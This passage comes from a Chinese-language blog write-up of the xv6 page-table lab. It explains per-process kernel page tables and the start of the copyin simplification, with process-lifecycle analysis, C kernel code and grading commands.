 _vmprint(pagetable, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=<span class="string">&quot;pte printout&quot;</span> grade</span><br></pre></td></tr></table></figure><br><img src="pte_printout实验结果.png" alt="pte printout实验结果"></p><h2 id="a-kernel-page-table-per-process"><a href="#a-kernel-page-table-per-process" class="headerlink" title="a kernel page table per process"></a>a kernel page table per process</h2><h3 id="要求-1"><a href="#要求-1" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Your first job is to modify the kernel so that every process uses its own copy of the kernel page table when executing in the kernel. Modify <strong>struct proc</strong> to maintain a kernel page table for each process, and modify the scheduler to switch kernel page tables when switching processes. For this step, each per-process kernel page table should be identical to the existing global kernel page table. You pass this part of the lab if <strong>usertests</strong> runs correctly.</p></blockquote><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>这部分内容着实需要对于xv6整体有非常好的理解</p><p>这里分析一下用户进程的生命周期</p><ul><li><p>进程的创建<br>如果是第一个用户进程，其在<strong>userinit</strong>(kernel/proc.c:223)中创建用户态地址空间，其关键的调用栈如下所示<br><img src="初始用户进程调用栈.png" alt="初始用户进程调用栈"><br>而对于其余的用户进程，其通过<strong>fork</strong>(kernel/proc.c:269)来继承用户态地址空间，其关键的调用栈如下所示<br><img src="非初始用户进程调用栈.png" alt="非初始用户进程调用栈"></p><p>再直白些，进程的创建主要设置进程<strong>S-mode</strong>的<strong>context</strong>(<strong>struct proc</strong>的<strong>context</strong>字段，主要用于scheduler)和进程<strong>U-mode</strong>的<strong>context</strong>(<strong>struct proc</strong>的<strong>trapframe</strong>字段，用于恢复用户态执行)</p></li><li><p>进程的初始化<br>在<strong>进程的创建</strong>中，所有的进程的<strong>struct proc</strong>的<strong>context</strong>字段的<strong>ra</strong>值，在<strong>allocproc</strong>(kernel/proc.c:92)中被设置为<strong>forkret</strong>(kernel/proc.c:562)</p><p>在<strong>scheduler</strong>(kernel/proc.c:467)中，调用<strong>swtch</strong>(kernel/swtch.S:9)，从而切换到进程的<strong>struct proc</strong>的<strong>context</strong>上下文，其关键的调用栈如下所示<br><img src="进程的初始化调用栈.png" alt="进程的初始化调用栈"></p><p>再直白些，<strong>scheduler</strong>(kernel/proc.c:467)从<strong>context</strong>字段恢复上下文后，在<strong>forkret</strong>(kernel/proc:562)完成相关资源初始化后，通过<strong>usertrapret</strong>(kernel/trap.c:89)，类似与<strong>trap</strong>返回，从<strong>trapframe</strong>字段恢复<strong>U-mode</strong>的上下文</p><p>一般来说，其会在<strong>U-mode</strong>接着调用<strong>exec</strong>系统调用，相关调用栈如下所示<br><img src="exec调用栈.png" alt="exec调用栈"></p><p><strong>exec</strong>(kernel/exec.c:13)就是通过<strong>proc_pagetable</strong>(kernel/proc.c:168)新创建用户态地址空间，并通过<strong>uvmalloc</strong>(kernel/proc.c:168)和<strong>copyout</strong>(kernel/vm.c:424)将执行文件映射入用户态地址空间，同时释放掉原始的用户态地址空间</p></li><li><p>进程的终结<br>当进程结束时，其会调用<strong>exit</strong>系统调用，最后执行<strong>exit</strong>(kernel/proc.c:343)，来释放并更改进程的状态。其关键的调用栈如下所示<br><img src="exit调用栈.png" alt="exit调用栈"></p><p>实际上，<strong>exit</strong>(kernel/proc.c:343)仅仅将进程状态标记为<strong>ZOMBIE</strong>，然后更改与其余进程的关系，但并此时仍然没有释放进程的资源(类似于Linux的<strong>defunct</strong>状态)</p><p>其进程资源的彻底释放，是等待该进程的父进程调用<strong>wait</strong>系统调用，从而回收进程的资源。其关键的调用栈如下所示<br><img src="wait调用栈.png" alt="wait调用栈"></p></li></ul><p>了解了进程的声明周期后，给其添加<strong>process identical</strong>的内核页表就相对很简单了<br>很自然的，在进程的创建时构建内核页表；在进程释放其资源时释放内核页表(这里要特别小心，注意<strong>freeproc</strong>(kernel/proc.c:145)在生命周期中调用一次，而<strong>proc_freepagetable</strong>(kernel/proc.c:201)会在<strong>exec</strong>时同样调用)即可</p><p>而另一个问题时何时切换页表。根据前面的分析，<strong>swtch</strong>(kernel/swtch.S:9)时才切入或切出进程的内核上下文。因此在<strong>swtch</strong>(kernel/swtch.S:9)调用前和后切换就行。<br>而考虑到如下因素</p><ul><li><strong>swtch</strong>(kernel/swtch.S:9)是汇编代码不方便插入</li><li><strong>swtch</strong>(kernel/swtch.S:9)切入和切出后立马进入<strong>scheduler</strong>(kernel/proc.c:494)</li><li><strong>scheduler</strong>(kernel/proc.c:494)使用自己独立，位于内核镜像的全局变量声明的栈</li></ul><p>因此，在<strong>scheduler</strong>调用<strong>swtch</strong>和从<strong>swtch</strong>返回时完成页表的切换即可。<br>这里则特别提醒一下，从<strong>swtch</strong>跳出后，需要将内核页表切换为原始的全局页表——因为从<strong>swtch</strong>返回时，使用的仍然是之前进程的<strong>process identical</strong>内核页表，而从<strong>swtch</strong>返回，可能是因为进程结束，则进程的资源(<strong>process identical</strong>内核页表)可能会被其他CPU释放掉，导致该<strong>process identical</strong>内核页表无效，则继续使用必然会导致相关的错误</p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>首先，在<strong>struct proc</strong>结构体中，添加<strong>process identical</strong>的内核页表字段<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.h</span></span><br><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// p-&gt;lock must be held when using these:</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">procstate</span> <span class="title">state</span>;</span>        <span class="comment">// Process state</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span>         <span class="comment">// Parent process</span></span><br><span class="line">  <span class="type">void</span> *chan;                  <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="type">int</span> killed;                  <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="type">int</span> xstate;                  <span class="comment">// Exit status to be returned to parent&#x27;s wait</span></span><br><span class="line">  <span class="type">int</span> pid;                     <span class="comment">// Process ID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// these are private to the process, so p-&gt;lock need not be held.</span></span><br><span class="line">  uint64 kstack;               <span class="comment">// Virtual address of kernel stack</span></span><br><span class="line">  uint64 sz;                   <span class="comment">// Size of process memory (bytes)</span></span><br><span class="line">  <span class="type">pagetable_t</span> pagetable;       <span class="comment">// User page table</span></span><br><span class="line">  <span class="type">pagetable_t</span> kernel_pagetable;<span class="comment">// process&#x27;s identical kernel page-table</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">trapframe</span>;</span> <span class="comment">// data page for trampoline.S</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>      <span class="comment">// swtch() here to run process</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">ofile</span>[<span class="title">NOFILE</span>];</span>  <span class="comment">// Open files</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">cwd</span>;</span>           <span class="comment">// Current directory</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">16</span>];               <span class="comment">// Process name (debugging)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>其次，添加<strong>process identical</strong>内核页表的分配和释放即可<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * create a process&#x27;s identical kernel page table</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">pagetable_t</span></span><br><span class="line"><span class="title function_">ukvminit</span><span class="params">(uint64 kstack)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pagetable_t</span> pagetable = (<span class="type">pagetable_t</span>) kalloc();</span><br><span class="line">  <span class="keyword">if</span>(pagetable == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// uart registers</span></span><br><span class="line">  mappages(pagetable, UART0, PGSIZE, </span><br><span class="line">            UART0, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// virtio mmio disk interface</span></span><br><span class="line">  mappages(pagetable, VIRTIO0, PGSIZE, </span><br><span class="line">            VIRTIO0, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// CLINT</span></span><br><span class="line">  mappages(pagetable, CLINT, <span class="number">0x10000</span>, </span><br><span class="line">            CLINT, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PLIC</span></span><br><span class="line">  mappages(pagetable, PLIC, <span class="number">0x400000</span>, </span><br><span class="line">            PLIC, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map kernel text executable and read-only.</span></span><br><span class="line">  mappages(pagetable, KERNBASE, (uint64)etext-KERNBASE,</span><br><span class="line">            KERNBASE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span></span><br><span class="line">  mappages(pagetable, (uint64)etext, PHYSTOP-(uint64)etext,</span><br><span class="line">            (uint64)etext, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map the trampoline for trap entry/exit to</span></span><br><span class="line">  <span class="comment">// the highest virtual address in the kernel.</span></span><br><span class="line">  mappages(pagetable, TRAMPOLINE, PGSIZE,</span><br><span class="line">          (uint64)trampoline, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Map the process&#x27;s kernel stack in kernel_pagetable</span></span><br><span class="line">  <span class="comment">// to the process&#x27;s identical kernel page-table </span></span><br><span class="line">  uint64 pa = kvmpa(kstack);</span><br><span class="line">  mappages(pagetable, kstack, PGSIZE, </span><br><span class="line">            pa, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> pagetable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Recursively free page-table pages.</span></span><br><span class="line"><span class="comment">// All leaf mappings is ignored,</span></span><br><span class="line"><span class="comment">// For it must be kernel mappings, or</span></span><br><span class="line"><span class="comment">// it will be free in nvmunmap</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ukvmfree</span><span class="params">(<span class="type">pagetable_t</span> pagetable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// there are 2^9 = 512 PTEs in a page table.</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++)&#123;</span><br><span class="line">    <span class="type">pte_t</span> pte = pagetable[i];</span><br><span class="line">    <span class="keyword">if</span>((pte &amp; PTE_V) &amp;&amp; (pte &amp; (PTE_R|PTE_W|PTE_X)) == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="comment">// this PTE points to a lower-level page table.</span></span><br><span class="line">      uint64 child = PTE2PA(pte);</span><br><span class="line">      ukvmfree((<span class="type">pagetable_t</span>)child);</span><br><span class="line">      pagetable[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  kfree((<span class="type">void</span>*)pagetable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>接着，在进程分配和释放时，同时分配和释放对应的内核页表<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"><span class="comment">// Look in the process table for an UNUSED proc.</span></span><br><span class="line"><span class="comment">// If found, initialize state required to run in the kernel,</span></span><br><span class="line"><span class="comment">// and return with p-&gt;lock held.</span></span><br><span class="line"><span class="comment">// If there are no free procs, or a memory allocation fails, return 0.</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> proc*</span><br><span class="line"><span class="title function_">allocproc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">    acquire(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state == UNUSED) &#123;</span><br><span class="line">      <span class="keyword">goto</span> found;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      release(&amp;p-&gt;lock);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">found:</span><br><span class="line">  p-&gt;pid = allocpid();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate a trapframe page.</span></span><br><span class="line">  <span class="keyword">if</span>((p-&gt;trapframe = (<span class="keyword">struct</span> trapframe *)kalloc()) == <span class="number">0</span>)&#123;</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// An empty user page table.</span></span><br><span class="line">  p-&gt;pagetable = proc_pagetable(p);</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;pagetable == <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(p);</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// A process&#x27;s identical kernel page-table</span></span><br><span class="line">  p-&gt;kernel_pagetable = ukvminit(p-&gt;kstack);</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;kernel_pagetable == <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(p);</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set up new context to start executing at forkret,</span></span><br><span class="line">  <span class="comment">// which returns to user space.</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;p-&gt;context, <span class="number">0</span>, <span class="keyword">sizeof</span>(p-&gt;context));</span><br><span class="line">  p-&gt;context.ra = (uint64)forkret;</span><br><span class="line">  p-&gt;context.sp = p-&gt;kstack + PGSIZE;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// free a proc structure and the data hanging from it,</span></span><br><span class="line"><span class="comment">// including user pages.</span></span><br><span class="line"><span class="comment">// p-&gt;lock must be held.</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">freeproc</span><span class="params">(<span class="keyword">struct</span> proc *p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;trapframe)</span><br><span class="line">    kfree((<span class="type">void</span>*)p-&gt;trapframe);</span><br><span class="line">  p-&gt;trapframe = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;kernel_pagetable)</span><br><span class="line">    ukvmfree(p-&gt;kernel_pagetable);</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;pagetable)</span><br><span class="line">    proc_freepagetable(p-&gt;pagetable, p-&gt;sz);</span><br><span class="line">  p-&gt;kernel_pagetable = <span class="number">0</span>;</span><br><span class="line">  p-&gt;pagetable = <span class="number">0</span>;</span><br><span class="line">  p-&gt;sz = <span class="number">0</span>;</span><br><span class="line">  p-&gt;pid = <span class="number">0</span>;</span><br><span class="line">  p-&gt;parent = <span class="number">0</span>;</span><br><span class="line">  p-&gt;name[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  p-&gt;chan = <span class="number">0</span>;</span><br><span class="line">  p-&gt;killed = <span class="number">0</span>;</span><br><span class="line">  p-&gt;xstate = <span class="number">0</span>;</span><br><span class="line">  p-&gt;state = UNUSED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后，则是在<strong>scheduler</strong>函数中，完成内核页表的切换即可<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"><span class="comment">// Per-CPU process scheduler.</span></span><br><span class="line"><span class="comment">// Each CPU calls scheduler() after setting itself up.</span></span><br><span class="line"><span class="comment">// Scheduler never returns.  It loops, doing:</span></span><br><span class="line"><span class="comment">//  - choose a process to run.</span></span><br><span class="line"><span class="comment">//  - swtch to start running that process.</span></span><br><span class="line"><span class="comment">//  - eventually that process transfers control</span></span><br><span class="line"><span class="comment">//    via swtch back to the scheduler.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">scheduler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> *<span class="title">c</span> =</span> mycpu();</span><br><span class="line">  </span><br><span class="line">  c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="comment">// Avoid deadlock by ensuring that devices can interrupt.</span></span><br><span class="line">    intr_on();</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">      acquire(&amp;p-&gt;lock);</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state == RUNNABLE) &#123;</span><br><span class="line">        <span class="comment">// Switch to chosen process.  It is the process&#x27;s job</span></span><br><span class="line">        <span class="comment">// to release its lock and then reacquire it</span></span><br><span class="line">        <span class="comment">// before jumping back to us.</span></span><br><span class="line">        p-&gt;state = RUNNING;</span><br><span class="line">        c-&gt;proc = p;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// When switch to other process</span></span><br><span class="line">        <span class="comment">// Just change to process&#x27;s identical kernel page-table</span></span><br><span class="line">        <span class="comment">// as requested</span></span><br><span class="line">        w_satp(MAKE_SATP(p-&gt;kernel_pagetable));</span><br><span class="line">        sfence_vma();</span><br><span class="line"></span><br><span class="line">        swtch(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Return from swtch, satp point to the process identical kernel page-table</span></span><br><span class="line">        <span class="comment">// What&#x27;s worse, the process resource may be cleaned, which result the satp</span></span><br><span class="line">        <span class="comment">// a invalid page-table</span></span><br><span class="line">        <span class="comment">// so, we need switch to the common kernel page-table, which is always a</span></span><br><span class="line">        <span class="comment">// invalid page-table contains all page-table</span></span><br><span class="line">        kvminithart();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Process is done running for now.</span></span><br><span class="line">        <span class="comment">// It should have changed its p-&gt;state before coming back.</span></span><br><span class="line">        c-&gt;proc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        found = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      release(&amp;p-&gt;lock);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined (LAB_FS)</span></span><br><span class="line">    <span class="keyword">if</span>(found == <span class="number">0</span>) &#123;</span><br><span class="line">      intr_on();</span><br><span class="line">      <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;wfi&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    ;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=<span class="string">&quot;usertests&quot;</span> grade</span><br></pre></td></tr></table></figure><br><img src="usertests实验结果.png" alt="a kernel page table per process实验结果"></p><h2 id="simplify-copyin-copyinstr"><a href="#simplify-copyin-copyinstr" class="headerlink" title="simplify copyin/copyinstr"></a>simplify copyin/copyinstr</h2><h3 id="要求-2"><a href="#要求-2" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Replace the body of <strong>copyin</strong> in <strong>kernel/vm.c</strong> with a call to <strong>copyin_new</strong> (defined in <strong>kernel/vmcopyin.c</strong>); do the same for <strong>copyinstr</strong> and <strong>copyinstr_new</strong>. Add mappings for user addresses to each process’s kernel page table so that <strong>copyin_new</strong> and <strong>copyinstr_new</strong> work. You pass this assignment if <strong>usertests</strong> runs correctly and all the <strong>make grade</strong> tests pass.</p></blockquote><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>根据实验指南，只需要在每次更改<strong>U-mode</strong>页表映射时，以相同的方式更改<strong>S-mode</strong>的<strong>process identical</strong>的内核页表映射即可</p><p>实际上，改变<strong>U-mode</strong>页表映射只会出现在<strong>sys_exec</strong>(kernel/sysfile.c:415)、<strong>sys_fork</strong>(kernel/sysproc.c:26)、<strong>sys_sbrk</strong>(kernel/sysproc.c:41)、<strong>freeproc</strong>(kernel/proc.c:144)和<strong>userinit</strong>(kernel/proc.c:223)中</p><p>而添加和删除相关的<strong>process identical</strong>的内核页表和上一个<strong>lab</strong>并没有什么区别——仅仅是删除时删除指定的页表项</p><h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><p>首先，实现在<strong>process identical</strong>的内核页表中，添加<strong>U-mode</strong>的页表映射关系<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Map the user virtual memory to the physical memory</span></span><br><span class="line"><span class="comment">// in the same way in user pagetable</span></span><br><span class="line"><span class="comment">// it should map in S-mode perm; and it should has limit the maximum size </span></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">ukvmmap</span><span class="params">(<span class="type">pagetable_t</span> kp, <span class="type">pagetable_t</span> up, uint64 oldsz, uint64 newsz)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 a;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(newsz &lt; oldsz)</span><br><span class="line">    <span class="keyword">return</span> <span 